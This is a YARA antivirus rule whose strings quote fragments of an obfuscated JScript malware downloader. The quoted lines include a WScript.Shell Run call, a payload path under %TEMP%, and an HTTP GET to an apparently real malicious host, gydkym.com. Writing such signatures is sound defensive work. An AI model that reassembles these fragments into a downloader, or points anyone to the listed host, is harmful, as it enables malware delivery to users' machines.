rule sig_20160328_e46478b770fae986e17f30dfc6cf560b {
  meta:
    description = "datamaliciousorder - file 20160328_e46478b770fae986e17f30dfc6cf560b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b09c0aaed0fd053d7d7dac5ca777e676aa15465f0c16ce9339d5018d81f25bdc"

  strings:
    $s1  = "function Iasafwfzfs() {return Zzqvvlaief[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ruMzRRFkbDg.exe\";};" fullword ascii
    $s2  = "Aodmx[Txcepdfu](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Qnbmcylw](Qrrai() * 11)} while (Aodmx[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Zzqvvlaief = function Efhmc() {return WScript[Qjfthcu](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Byrzq(Enlnyw, Slxox){return Enlnyw - Slxox;};" fullword ascii
    $s6  = "function Agyeh(Ykeyjlw){Zzqvvlaief[\"Run\"](Ykeyjlw, Ckrud, Ckrud);};" fullword ascii
    $s7  = "function Aidgkara() {return ((Itpqh == true) && (Itpqh == Yvyxdods)) ? 1 : Ckrud;};" fullword ascii
    $s8  = "var Xtlqzlb = false;" fullword ascii
    $s9  = "function Zhdrvysmfb()" fullword ascii
    $s10 = "function Zcpja(){return Qjfthcu;};" fullword ascii
    $s11 = "function Emqup(){return Tawxghcdtt;};" fullword ascii
    $s12 = "var Czvyqizna = new this[\"Date\"]();" fullword ascii
    $s13 = "function Qrrai(){return 22;};" fullword ascii
    $s14 = "return Byrzq(Qyovsvatd, Pakjy);" fullword ascii
    $s15 = "var Yvyxdods = false;" fullword ascii
    $s16 = "Itpqh = true; " fullword ascii
    $s17 = "function Amdxcbtabf(Ossvtkobf) {var Efkpzuwei = (1, 2, 3, 4, 5, Ossvtkobf); return Efkpzuwei;};" fullword ascii
    $s18 = " while (Tlilltx){" fullword ascii
    $s19 = "Yvyxdods = true; " fullword ascii
    $s20 = "var Itpqh = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}